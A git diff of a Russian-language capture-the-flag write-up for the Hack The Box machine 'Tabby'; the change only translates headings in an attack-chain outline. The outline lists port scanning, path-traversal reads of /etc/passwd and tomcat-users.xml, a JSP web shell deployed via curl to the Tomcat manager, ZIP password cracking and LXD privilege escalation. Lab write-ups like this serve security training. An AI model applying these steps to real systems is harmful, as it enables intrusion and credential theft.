@@ -10,30 +10,30 @@
 ## Цепочка Атаки
 
 ```text
-Reconnaissance
+Разведка
 ├── nmap -p- --min-rate=5000 -T4 → 22 (SSH), 80 (Apache "Mega Hosting"), 8080 (Tomcat)
 └── /etc/hosts: 10.129.77.170 tabby.htb megahosting.htb
 
-Foothold (LFI → Tomcat creds)
+Первичный Доступ (LFI → Tomcat creds)
 ├── news.php?file=statement → LFI
 ├── ../../../../etc/passwd → ash (uid 1000)
 ├── ../../../../usr/share/tomcat9/etc/tomcat-users.xml
 └── tomcat:<PASSWORD> (admin-gui,manager-script)
 
-Exploitation (WAR deploy)
+Эксплуатация (WAR deploy)
 ├── /manager/html → 401 (нет manager-gui)
 ├── /manager/text/list → OK (manager-script работает)
 ├── jar -cvf cmd.war cmd.jsp
 ├── curl -T cmd.war ".../manager/text/deploy?path=/cmd&update=true"
 └── shell от tomcat (uid 997)
 
-Lateral Movement (ZIP crack)
+Боковое Перемещение (ZIP crack)
 ├── /var/www/html/files/16162020_backup.zip
 ├── zip2john → john → <PASSWORD>
 ├── su ash → <PASSWORD>
 └── cat /home/ash/user.txt → <USER_FLAG>
 
-Privilege Escalation (LXD)
+Повышение Привилегий (LXD)
 ├── id → groups=...,116(lxd)
 ├── lxc storage create default dir
 ├── lxc profile device add default root disk path=/ pool=default
